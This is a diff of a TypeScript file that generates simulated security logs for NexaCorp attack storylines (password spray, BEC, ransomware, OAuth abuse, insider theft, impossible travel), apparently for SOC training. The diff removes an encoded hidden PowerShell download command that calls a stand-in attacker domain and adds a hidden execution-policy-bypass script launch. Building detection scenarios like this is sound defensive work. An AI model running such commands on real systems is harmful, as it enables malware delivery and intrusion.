         "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7RVTLB3D",
+        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7EXAMPLE",
         "aws.s3.bucket.name": "nexacorp-crm-exports",
         "storage.object.name": "exports/customer-financial-data-2026.zip",
         "network.bytes_out": "184000000",
@@ -740,6 +463,7 @@ export function phishingToExfilEvents() {
     },
 
     // ── CORRELATED: Baseline — j.smith normal morning Okta login from Israel ─────
+    // (the account's normal location, to contrast with 11c/12's source IP)
     {
       id: "evt_phish_baseline_01", ts: T(-30 * MIN), is_baseline: true,
       source: "okta", vendor: "Okta",
@@ -767,7 +491,7 @@ export function phishingToExfilEvents() {
     },
   ];
 
-  return { title: "Phishing → Cloud Exfiltration", events, T, MIN, victim, c2Domain, c2Ip, attackerIp, dllHash };
+  return { title: "Phishing Macro → AWS Key Theft → S3 Download", events, T, MIN, victim, c2Domain, c2Ip, attackerIp, senderIp, dllHash };
 }
 
 /** Telemetry half of `buildBecScenario`: the events and the story title, no answer key. */
@@ -777,21 +501,27 @@ export function becScenarioEvents() {
   const MIN = 60_000;
 
   const victim      = { hostname: "LAPTOP-FIN-04", email: "l.harris@nexacorp.com", ip: "10.10.30.21" };
-  const attackerIp  = "91.108.56.122";
+  // Story-specific infrastructure (not shared with phishing / oauth).
+  const attackerIp  = "77.83.247.146";
   const sprayIp     = "158.131.159.30";
+  const adfsIp      = "10.10.1.15";
 
   const events: TelemetryEvent[] = [
+    // The spray hits the internet-facing AD FS farm, not a DC: the AD FS server
+    // validates each password itself and writes the 4625 locally (caller =
+    // the AD FS service host, no client IP — that lives in the firewall row
+    // and AD FS audit 411). One representative record of the burst.
     {
       id: "evt_01_spray", ts: T(0),
       source: "ad", vendor: "Windows Security", event_type: "auth_failure",
-      src_ip: sprayIp,
+      hostname: "SRV-ADFS01",
       severity: "high", mitre_technique: "T1110.003",
-      description: `47 failed logins across 14 different NexaCorp accounts arrived from the same IP (${sprayIp}) within 4 minutes.`,
+      description: "SRV-ADFS01 logged a failed logon (bad password) for l.harris through the AD FS service — one of a burst of failures for different accounts that began at 08:00.",
       raw: {
-        // Windows Security Event 4625 — Failed Logon (representative entry for spray aggregate)
+        // Windows Security Event 4625 — Failed Logon, logged on the AD FS server
         "winlog.event_id": "4625",
         "winlog.channel": "Security",
-        "winlog.computer_name": "DC01",
+        "winlog.computer_name": "SRV-ADFS01",
         "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
         "winlog.record_id": "1048301",
         // Subject (no authenticated subject for failed logons from external)
@@ -807,24 +537,23 @@ export function becScenarioEvents() {
         "winlog.event_data.Status": "0xC000006D",
         "winlog.event_data.SubStatus": "0xC000006A",
         "winlog.event_data.FailureReason": "%%2313",
-        // Logon details
+        // Logon details — AD FS forms auth calls LogonUser from its service host
         "winlog.event_data.LogonType": "3",
-        "winlog.event_data.LogonProcessName": "NtLmSsp ",
-        "winlog.event_data.AuthenticationPackageName": "NTLM",
-        "winlog.event_data.WorkstationName": "-",
-        "winlog.event_data.IpAddress": sprayIp,
-        "winlog.event_data.IpPort": "49234",
+        "winlog.event_data.LogonProcessName": "Advapi  ",
+        "winlog.event_data.AuthenticationPackageName": "Negotiate",
+        "winlog.event_data.WorkstationName": "SRV-ADFS01",
+        "winlog.event_data.ProcessName": "C:\\Windows\\ADFS\\Microsoft.IdentityServer.ServiceHost.exe",
+        "winlog.event_data.IpAddress": "-",
+        "winlog.event_data.IpPort": "-",
         // ECS fields
         "event.code": "4625",
         "event.action": "logon-failed",
         "event.outcome": "failure",
         "event.created": "2026-05-08T08:00:00.000Z",
+        "host.name": "SRV-ADFS01",
         "authentication.status": "failure",
         "authentication.failure_reason": "wrong_password",
-        "authentication.protocol": "NTLM",
         "logon.type": "3",
-        "source.ip": sprayIp,
-        "source.geo.country_name": "Netherlands",
       },
     },
     // ── CORRELATED: Firewall — spray IP connection volume to ADFS proxy port 443 ─
@@ -833,7 +562,7 @@ export function becScenarioEvents() {
       source: "firewall", vendor: "Palo Alto Networks PAN-OS",
       event_type: "net_connection", severity: "high",
       mitre_technique: "T1110.003",
-      src_ip: sprayIp, dst_ip: "10.10.1.15", dst_port: 443,
+      src_ip: sprayIp, dst_ip: adfsIp, dst_port: 443,
       description: `The firewall logged 47 inbound HTTPS connections from ${sprayIp} to the ADFS extranet proxy (adfs.nexacorp.com) in 4 minutes.`,
       raw: {
         "event.action": "allow",
@@ -852,9 +581,9 @@ export function becScenarioEvents() {
     {
       id: "evt_02_lockout_1", ts: T(1 * MIN),
       source: "ad", vendor: "Windows Security", event_type: "auth_failure",
-      user_email: "a.nelson@nexacorp.com", src_ip: sprayIp,
+      user_email: "a.nelson@nexacorp.com", hostname: "DC01",
       severity: "medium",
-      description: `Account a.nelson was locked out after 5 failed password attempts from ${sprayIp}.`,
+      description: "DC01 locked out account a.nelson; the caller computer was SRV-ADFS01.",
       raw: {
         // Windows Security Event 4740 — Account Locked Out
         "winlog.event_id": "4740",
@@ -872,7 +601,7 @@ export function becScenarioEvents() {
         "winlog.event_data.TargetDomainName": "NEXACORP",
         "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1104",
         // Machine that triggered the lockout
-        "winlog.event_data.CallerComputerName": "\\\\158.131.159.30",
+        "winlog.event_data.CallerComputerName": "SRV-ADFS01",
         // ECS fields
         "event.code": "4740",
         "event.action": "account-locked-out",
@@ -882,7 +611,6 @@ export function becScenarioEvents() {
         "user.domain": "NEXACORP",
         "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1104",
         "host.name": "DC01",
-        "source.ip": sprayIp,
         "account.locked": "true",
         "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
       },
@@ -890,9 +618,9 @@ export function becScenarioEvents() {
     {
       id: "evt_03_lockout_2", ts: T(2 * MIN),
       source: "ad", vendor: "Windows Security", event_type: "auth_failure",
-      user_email: "r.garcia@nexacorp.com", src_ip: sprayIp,
+      user_email: "r.garcia@nexacorp.com", hostname: "DC01",
       severity: "medium",
-      description: `Account r.garcia was also locked out from ${sprayIp}, minutes after a.nelson.`,
+      description: "DC01 locked out account r.garcia one minute after a.nelson; the caller computer was again SRV-ADFS01.",
       raw: {
         // Windows Security Event 4740 — Account Locked Out
         "winlog.event_id": "4740",
@@ -910,7 +638,7 @@ export function becScenarioEvents() {
         "winlog.event_data.TargetDomainName": "NEXACORP",
         "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1106",
         // Machine that triggered the lockout
-        "winlog.event_data.CallerComputerName": "\\\\158.131.159.30",
+        "winlog.event_data.CallerComputerName": "SRV-ADFS01",
         // ECS fields
         "event.code": "4740",
         "event.action": "account-locked-out",
@@ -920,7 +648,6 @@ export function becScenarioEvents() {
         "user.domain": "NEXACORP",
         "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1106",
         "host.name": "DC01",
-        "source.ip": sprayIp,
         "account.locked": "true",
         "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
       },
@@ -939,8 +666,11 @@ export function becScenarioEvents() {
         "azure.signinlogs.app_display_name": "Microsoft 365",
         "azure.signinlogs.client_app_used": "Browser",
         "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
-        "azure.signinlogs.conditional_access_status": "notApplied",
+        // The MFA requirement came from the CA policy, which the push satisfied.
+        "azure.signinlogs.conditional_access_status": "success",
         "azure.signinlogs.risk_level_aggregated": "high",
+        "azure.signinlogs.risk_level_during_signin": "high",
+        "azure.signinlogs.risk_event_types_v2": "unfamiliarFeatures",
         "azure.signinlogs.risk_state": "atRisk",
         "azure.signinlogs.is_interactive": "true",
         "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
@@ -966,7 +696,34 @@ export function becScenarioEvents() {
         "authentication.factor": "push_notification",
         "risk.level": "High",
         "logon.local_time": "02:12",
-        "ca_policy_applied": "none",
+        "ca_policy_applied": "Require MFA - All users",
+      },
+    },
+    // ── First alert: Identity Protection's real-time detection on that sign-in, as it lands in Sentinel ──
+    {
+      id: "evt_bec_idp_alert", ts: T(12 * MIN + 20_000),
+      source: "siem", vendor: "Microsoft Sentinel", event_type: "risk_score_change",
+      user_email: victim.email, src_ip: attackerIp,
+      severity: "high", mitre_technique: "T1078", is_detection: true,
+      description: `Sentinel received the Identity Protection alert "Unfamiliar sign-in properties" (High) for l.harris, source IP ${attackerIp}, unregistered Windows device.`,
+      raw: {
+        "AlertName": "Unfamiliar sign-in properties",
+        "ProductName": "Azure Active Directory Identity Protection",
+        "ProviderName": "IPC",
+        "AlertSeverity": "High",
+        "AlertType": "UnfamiliarLocation",
+        "Status": "New",
+        "CompromisedEntity": "l.harris@nexacorp.com",
+        "StartTime": T(12 * MIN),
+        "TimeGenerated": T(12 * MIN + 20_000),
+        "Entities.Account.UPNSuffix": "nexacorp.com",
+        "Entities.Account.Name": "l.harris",
+        "Entities.IP.Address": attackerIp,
+        "ExtendedProperties.Client IP Address": attackerIp,
+        "ExtendedProperties.Client Location": "Amsterdam, North Holland, NL",
+        "ExtendedProperties.Detection Timing Type": "realtime",
+        "ExtendedProperties.Request Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
+        "event.action": "alert",
       },
     },
 
@@ -1116,7 +873,7 @@ export function becScenarioEvents() {
         "data.office365.ResultStatus": "True",
         "data.office365.ClientIP": attackerIp,
         // Email fields
-        "email.message_id": "<CABcD3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b4c5@mail.outlook.com>",
+        "email.message_id": "<cabcd3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b4c5@mail.outlook.com>",
         "email.from.address": "l.harris@nexacorp.com",
         "email.from.display_name": "Laura Harris",
         "email.to.address": "p.johnson@nexacorp.com",
@@ -1229,7 +986,8 @@ export function ransomwareScenarioEvents() {
 
   const zero    = { hostname: "WS-FIN-1193", email: "c.martin@nexacorp.com",  ip: "10.10.20.33" };
   const server  = { hostname: "FS-CORP-01",  email: "svc-backup@nexacorp.com", ip: "10.10.10.12" };
-  const c2Ip    = "185.220.101.45";
+  // Story-specific C2 (the 185.220.101.0/24 Tor range was shared across storylines).
+  const c2Ip    = "94.131.98.17";
   const c2Dom   = "edge-cdn-updates.xyz";
   const rswHash = makeSha256("lockbit3_ransom_payload");
   const psxHash = makeSha256("psexec_lateral_tool");
@@ -1351,16 +1109,16 @@ export function ransomwareScenarioEvents() {
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
       severity: "critical", mitre_technique: "T1059.001",
-      description: "WINWORD.EXE on WS-FIN-1193 spawned a hidden, Base64-encoded PowerShell process 45 seconds after the phishing mail was delivered.",
+      description: "WINWORD.EXE on WS-FIN-1193 spawned a hidden PowerShell process with execution policy bypass, running a script from c.martin's Temp folder, 45 seconds after the phishing mail was delivered.",
       process: {
         name: "powershell.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 2244,
-        cmdline: "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbgBlAHgAYQBjAG8AcgBwAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAdQBwAGQAYQB0AGUALgBlAHgAZQA=",
+        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\cmartin\\AppData\\Local\\Temp\\pay_adj.ps1",
         user: "NEXACORP\\cmartin", integrity: "medium",
       },
       raw: {
         "event.action": "process_created",
         "process.name": "powershell.exe", "process.pid": "7741",
-        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbgBlAHgAYQBjAG8AcgBwAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAdQBwAGQAYQB0AGUALgBlAHgAZQA=",
+        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\cmartin\\AppData\\Local\\Temp\\pay_adj.ps1",
         "process.parent.name": "WINWORD.EXE", "process.parent.pid": "2244",
         "user.name": "NEXACORP\\cmartin", "host.name": "WS-FIN-1193",
         "process.integrity": "medium",
@@ -1804,19 +1562,21 @@ export function oauthScenarioEvents() {
 
   const victim     = { hostname: "MBP-SCHEN-01", email: "s.chen@nexacorp.com",  ip: "10.10.50.18" };
   const sprayIp    = "91.108.56.199";
-  const sessionIp  = "185.220.101.88";
+  // Story-specific (the 185.220.101.0/24 Tor range was shared across storylines).
+  const sessionIp  = "193.233.20.57";
   const appId      = "3a7f8b2c-d491-4e6a-9f3b-1c5d8e7a2b4f";
 
   const events: TelemetryEvent[] = [
     {
       id: "evt_01_spray", ts: T(0),
       source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_failure",
-      src_ip: sprayIp,
+      user_email: victim.email, src_ip: sprayIp,
       severity: "high", mitre_technique: "T1110.003",
-      description: `43 failed Microsoft 365 login attempts hit 12 accounts, including s.chen, from the same German IP (${sprayIp}) within 6 minutes.`,
+      description: `Entra ID recorded a failed sign-in (50126, invalid password) for s.chen from ${sprayIp} (Frankfurt) — one of a burst of failures against different accounts from this IP that began at 02:30.`,
       raw: {
-        // Entra ID sign-in failure aggregate — password spray from Germany
+        // Entra ID sign-in failure — one representative record of the spray
         "azure.signinlogs.correlation_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
+        "azure.signinlogs.user_principal_name": "s.chen@nexacorp.com",
         "azure.signinlogs.resultType": "50126",
         "azure.signinlogs.result_description": "Invalid username or password",
         "azure.signinlogs.client_app_used": "Browser",
@@ -1849,8 +1609,6 @@ export function oauthScenarioEvents() {
         "event.created": "2026-05-06T02:30:00.000Z",
         "authentication.status": "failure",
         "authentication.failure_reason": "wrong_password",
-        "authentication.protocol": "NTLM",
-        "logon.type": "3",
         "source.ip": sprayIp,
         "source.geo.country_name": "Germany",
       },
@@ -2006,7 +1764,7 @@ export function oauthScenarioEvents() {
     // ── CORRELATED: Immediate mailbox access via Graph API after consent ──────────
     {
       id: "evt_oauth_immediate_mailbox", ts: T(17 * MIN),
-      source: "o365", vendor: "Microsoft Graph Security API",
+      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
       event_type: "cloud_api_call", severity: "high",
       user_email: victim.email, src_ip: sprayIp,
       mitre_technique: "T1114.002",
@@ -2026,7 +1784,7 @@ export function oauthScenarioEvents() {
     },
     {
       id: "evt_05_graph_mail_1", ts: T(1 * HR + 15 * MIN),
-      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
+      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "high", mitre_technique: "T1114.002",
       description: `The MicrosoftSecurityUpdate app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp}.`,
@@ -2077,7 +1835,7 @@ export function oauthScenarioEvents() {
     },
     {
       id: "evt_07_graph_mail_2", ts: T(9 * HR + 30 * MIN),
-      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
+      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "high", mitre_technique: "T1114.002",
       description: "The MicrosoftSecurityUpdate app read 143 more emails from s.chen's inbox via Graph API, 2.5 hours after the password reset.",
@@ -2094,7 +1852,7 @@ export function oauthScenarioEvents() {
     },
     {
       id: "evt_08_sharepoint_dl", ts: T(11 * HR),
-      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
+      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "critical", mitre_technique: "T1530",
       description: "The app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API.",
@@ -2113,7 +1871,7 @@ export function oauthScenarioEvents() {
     },
     {
       id: "evt_09_onedrive_bulk", ts: T(12 * HR + 30 * MIN),
-      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
+      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "critical", mitre_technique: "T1530",
       description: "89 files (340MB, including 12 marked Confidential and 4 Restricted) were bulk-downloaded from s.chen's OneDrive in 8 minutes via the same app.",
@@ -2142,10 +1900,14 @@ export function oauthScenarioEvents() {
       source: "siem", vendor: "Microsoft Sentinel", event_type: "ueba_anomaly",
       user_email: victim.email,
       severity: "high",
-      description: "Microsoft 365 Security reported the MicrosoftSecurityUpdate app as still active, with 330 emails and 89 files accessed to date.",
+      description: "A Sentinel analytics rule reported the MicrosoftSecurityUpdate app as still active after s.chen's password reset, with 330 emails and 89 files accessed since consent.",
       raw: {
         "event.action": "AlertGenerated",
+        "AlertName": "OAuthApp_ActiveAfterCredentialReset",
         "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
+        "ExtendedProperties.Mail Items Accessed": 330,
+        "ExtendedProperties.Files Accessed": 89,
+        "ExtendedProperties.Password Reset Time": T(7 * HR),
         "user.email": "s.chen@nexacorp.com",
         "SuspiciousOAuthConsent": "true",
         // Named after what the product actually flagged — the token was
@@ -2285,20 +2047,39 @@ export function insiderThreatScenarioEvents() {
       },
     },
     {
+      // Moved BEFORE the downloads/USB copy: the HR-site access must precede the
+      // exfiltration of the layoff/headcount document that comes from that site.
+      id: "evt_08_hr_access", mitre_technique: "T1213.002", ts: T(5 * MIN),
+      source: "dlp", vendor: "Microsoft Purview", event_type: "cloud_api_call",
+      user_email: insider.email, src_ip: insider.ip,
+      severity: "medium",
+      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site.",
+      raw: {
+        "event.action": "FileAccessed", "event.outcome": "success",
+        "user.email": "m.torres@nexacorp.com",
+        "user.title": "Finance Analyst",
+        "source.ip": "10.10.20.91",
+        "cloud.resource.name": "nexacorp.sharepoint.com/sites/HR",
+        "data.office365.SourceFileName": "Headcount_Reduction_Plan_Nov26.xlsx",
+        "data.classification": "HRConfidential, Restricted",
+        "iam.permission": "read",
+      },
+    },
+    {
       id: "evt_02_sp_start", ts: T(10 * MIN),
       source: "dlp", vendor: "Microsoft Purview", event_type: "cloud_api_call",
       user_email: insider.email, src_ip: insider.ip,
       severity: "medium", mitre_technique: "T1530",
       description: "m.torres downloaded 12 files from the Finance SharePoint site in 3 minutes.",
       raw: {
-        // Representative record — FileDownloaded is written per file; the
-        // 12-file total (see description) is a SIEM-side aggregate across
-        // many records, not a count field on any single one.
+        // Representative record — FileDownloaded is written per file; the count is
+        // carried in a SIEM-side aggregate field (file.count) for this burst.
         "event.action": "FileDownloaded", "event.outcome": "success",
         "user.email": "m.torres@nexacorp.com",
         "source.ip": "10.10.20.91",
         "cloud.resource.name": "nexacorp.sharepoint.com/sites/Finance",
         "data.office365.SourceFileName": "Q2-Vendor-Payments.xlsx",
+        "file.count": "12",
         "cloud.provider": "Microsoft365",
       },
     },
@@ -2355,10 +2136,10 @@ export function insiderThreatScenarioEvents() {
       id: "evt_04_usb_insert", ts: T(30 * MIN),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
       hostname: insider.hostname, user_email: insider.email,
-      severity: "critical", mitre_technique: "T1052.001",
-      description: `A SanDisk USB drive (serial ${usbSerial}) was connected to WS-FIN-4421, and 47 files were copied to it within 23 seconds of mounting.`,
+      severity: "high", mitre_technique: "T1052.001",
+      description: `A SanDisk USB drive (serial ${usbSerial}) was mounted as E:\\ on WS-FIN-4421.`,
       raw: {
-        "crowdstrike.event_simpleName": "RemovableMediaConnected",
+        "crowdstrike.event_simpleName": "RemovableMediaVolumeMounted",
         "crowdstrike.detection.description": "Removable storage volume mounted.",
         "crowdstrike.detection.scenario": "removable_media_bulk_copy",
         "crowdstrike.detection.technique": "Exfiltration over USB Device",
@@ -2372,9 +2153,6 @@ export function insiderThreatScenarioEvents() {
         "usb.action": "mounted",
         "removable_media.type": "USB Flash Drive",
         "usb.mount_point": "E:\\",
-        // The mount event only records the mount — the 47 files copied
-        // afterward (see description) are the separate FileWrittenToRemovableMedia
-        // records that follow, not a field the mount event itself carries.
       },
     },
     {
@@ -2382,18 +2160,19 @@ export function insiderThreatScenarioEvents() {
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
       hostname: insider.hostname, user_email: insider.email,
       severity: "high",
-      description: "8 more files, including Employee_Salary_Master_2026.xlsx and Headcount_Reduction_Plan_Nov26.xlsx, were copied from Downloads to the same USB drive.",
+      file: { path: "E:\\Finance_Backup\\Employee_Salary_Master_2026.xlsx", name: "Employee_Salary_Master_2026.xlsx" },
+      // A user's drag-and-drop copy to the drive is Explorer's write.
+      process: { name: "explorer.exe", pid: 4212, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\mtorres", integrity: "medium" },
+      description: "Files from the Downloads folder, including Employee_Salary_Master_2026.xlsx and Headcount_Reduction_Plan_Nov26.xlsx, were copied to the E:\\Finance_Backup folder on the USB drive.",
       raw: {
         "crowdstrike.event_simpleName": "FileWrittenToRemovableMedia",
-        "crowdstrike.detection.description": "Multiple sensitive files copied from user Downloads folder directly to a mounted removable media device.",
-        "crowdstrike.detection.technique": "Exfiltration over USB Device",
-        "crowdstrike.detection.technique_id": "T1052.001",
         "event.action": "FileCopiedToRemovableMedia",
         "host.name": "WS-FIN-4421",
         "user.name": "NEXACORP\\mtorres",
         "file.directory": "C:\\Users\\mtorres\\Downloads\\",
         "usb.destination": "E:\\Finance_Backup\\",
         "file.name": "Employee_Salary_Master_2026.xlsx",
+        "file.count": "8",
         "file.classification": "HRConfidential",
         "usb.device.serial": usbSerial,
       },
@@ -2428,7 +2207,7 @@ export function insiderThreatScenarioEvents() {
       dst_port: 443, protocol: "tcp",
       network: { url: "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o", domain: "www.googleapis.com", method: "POST", bytes_out: 9_812_445 },
       severity: "high", mitre_technique: "T1567.002",
-      description: "Zscaler blocked a 9.8MB upload attempt from WS-FIN-4421 to a personal Google Cloud Storage bucket.",
+      description: "Zscaler blocked a 9.8MB upload of Finance_Backup.zip from WS-FIN-4421 to a personal Google Cloud Storage bucket.",
       raw: {
         "zscaler.action": "Blocked",
         "zscaler.reason": "DLP policy — Personal cloud upload blocked",
@@ -2438,6 +2217,8 @@ export function insiderThreatScenarioEvents() {
         "zscaler.urlcategory": "Personal Cloud Storage",
         "zscaler.reqmethod": "POST",
         "zscaler.reqsize": 9812445,
+        "zscaler.filename": "Finance_Backup.zip",
+        "zscaler.filetype": "zip",
         "zscaler.cip": "10.10.20.91",
         "user.email": "m.torres@nexacorp.com",
         "source.hostname": "WS-FIN-4421",
@@ -2463,22 +2244,6 @@ export function insiderThreatScenarioEvents() {
         "policy.name": "Finance-PII-External-Email",
         "policy.action": "AuditAndNotify",
         "action_result": "delivered",
-      },
-    },
-    {
-      id: "evt_08_hr_access", mitre_technique: "T1530", ts: T(55 * MIN),
-      source: "dlp", vendor: "Microsoft Purview", event_type: "cloud_api_call",
-      user_email: insider.email, src_ip: insider.ip,
-      severity: "medium",
-      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site.",
-      raw: {
-        "event.action": "FileAccessed", "event.outcome": "success",
-        "user.email": "m.torres@nexacorp.com",
-        "user.title": "Finance Analyst",
-        "source.ip": "10.10.20.91",
-        "cloud.resource.name": "nexacorp.sharepoint.com/sites/HR",
-        "data.classification": "HRConfidential, Restricted",
-        "iam.permission": "read",
       },
     },
     {
@@ -2567,8 +2332,34 @@ export function impossibleTravelScenarioEvents() {
   const user  = { email: "k.taylor@nexacorp.com", name: "k.taylor", sid: "S-1-5-21-3421479547-3897544621-1789562108-1113" };
   const isrIp = "77.125.38.201";   // ISP: HOT Mobile — Tel Aviv, Israel
   const nigIp = "41.203.64.9";     // ISP: MTN Nigeria — Lagos, Nigeria (4,320 km away)
+  const sessionId = "b6f1e2d3-7a84-4c19-9e52-1a0bcf33ee70"; // Entra session shared by the attacker's sign-in and the UAL rows
 
   const events: TelemetryEvent[] = [
+    // ── Step 0: credential origin — password spray that finally succeeds ────────
+    {
+      id: "evt_imp_00_spray", ts: T(-28 * MIN),
+      source: "o365", vendor: "Microsoft Entra ID",
+      event_type: "auth_failure", severity: "medium",
+      user_email: user.email, src_ip: nigIp,
+      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
+      mitre_technique: "T1110.003",
+      description: "k.taylor's account had a burst of failed Entra ID sign-ins from a Nigerian IP (error 50126, invalid password) before the successful sign-in.",
+      raw: {
+        "azure.signinlogs.properties.userPrincipalName": user.email,
+        "azure.signinlogs.properties.ipAddress": nigIp,
+        "azure.signinlogs.properties.appDisplayName": "Office 365 Exchange Online",
+        "azure.signinlogs.properties.status.errorCode": 50126,
+        "azure.signinlogs.properties.riskLevelDuringSignIn": "low",
+        "azure.signinlogs.properties.riskState": "atRisk",
+        "azure.signinlogs.properties.riskEventTypes_v2": ["unfamiliarFeatures"],
+        "GeoLocation.country_name": "Nigeria",
+        "GeoLocation.location.lat": 6.5244,
+        "GeoLocation.location.lon": 3.3792,
+        "event.action": "sign-in-failed",
+        "event.outcome": "failure",
+        "source.ip": nigIp,
+      },
+    },
     // ── Step 1: Normal Israeli login — baseline ────────────────────────────────
     {
       id: "evt_imp_01_baseline", is_baseline: true, ts: T(0),
@@ -2636,33 +2427,56 @@ export function impossibleTravelScenarioEvents() {
       },
     },
 
-    // ── Step 3: O365 login from same Nigerian IP — attacker reading emails ─────
+    // ── Step 2b: the Entra sign-in to the GlobalProtect app — single factor, no MFA ─
+    {
+      id: "evt_imp_02b_vpnauth", ts: T(4 * MIN + 20_000),
+      source: "o365", vendor: "Microsoft Entra ID",
+      event_type: "auth_success", severity: "high",
+      user_email: user.email, src_ip: nigIp,
+      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
+      mitre_technique: "T1078",
+      description: "k.taylor authenticated to the GlobalProtect VPN app through Entra ID from a Nigerian IP with a single factor (password only); Entra ID Protection rated the sign-in high risk (atypical travel).",
+      raw: {
+        "azure.signinlogs.properties.userPrincipalName": user.email,
+        "azure.signinlogs.properties.ipAddress": nigIp,
+        "azure.signinlogs.properties.appDisplayName": "GlobalProtect",
+        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
+        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
+        "azure.signinlogs.properties.riskState": "atRisk",
+        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel"],
+        "azure.signinlogs.properties.status.errorCode": 0,
+        "GeoLocation.country_name": "Nigeria",
+        "GeoLocation.location.lat": 6.5244,
+        "GeoLocation.location.lon": 3.3792,
+        "event.action": "logged-in",
+        "event.outcome": "success",
+        "source.ip": nigIp,
+      },
+    },
+
+    // ── Step 3: O365 login from same Nigerian IP — Entra flags it high risk (impossible travel) ─
     {
       id: "evt_imp_03_o365", ts: T(6 * MIN),
       source: "o365", vendor: "Microsoft Entra ID",
       event_type: "auth_success", severity: "high",
       user_email: user.email,
-      src_ip: nigIp,
+      src_ip: nigIp, is_detection: true,
       geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
       mitre_technique: "T1078",
-      description: "k.taylor's account authenticated to Azure AD from a Nigerian IP address.",
+      description: "k.taylor's account signed in to Microsoft 365 from a Nigerian IP; Entra ID Protection rated the sign-in high risk with an unlikely-travel risk detection.",
       raw: {
-        "data.office365.AzureActiveDirectoryEventType": "1",
-        "data.office365.Operation":        "UserLoggedIn",
-        "data.office365.Workload":         "AzureActiveDirectory",
-        "data.office365.RecordType":       "15",
-        "data.office365.Version":          "1",
-        "data.office365.UserId":           user.email,
-        "data.office365.ClientIP":         nigIp,
-        "data.office365.ActorIpAddress":   nigIp,
-        "data.office365.OrganizationId":   "a7b8c9d0-1234-5678-abcd-ef0123456789",
-        "data.office365.ResultStatus":     "Success",
-        "data.office365.ErrorNumber":      "0",
-        "data.office365.UserType":         "0",
-        "data.office365.ExtendedProperties.Name":  "ResultStatusDetail",
-        "data.office365.ExtendedProperties.Value": "Success",
-        "data.office365.DeviceProperties.Name":    "TrustType",
-        "data.office365.DeviceProperties.Value":   "NotManaged",
+        "azure.signinlogs.properties.userPrincipalName": user.email,
+        "azure.signinlogs.properties.ipAddress": nigIp,
+        "azure.signinlogs.properties.appDisplayName": "OfficeHome",
+        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
+        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
+        "azure.signinlogs.properties.riskLevelAggregated": "high",
+        "azure.signinlogs.properties.riskState": "atRisk",
+        "azure.signinlogs.properties.riskDetail": "none",
+        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel", "unfamiliarFeatures"],
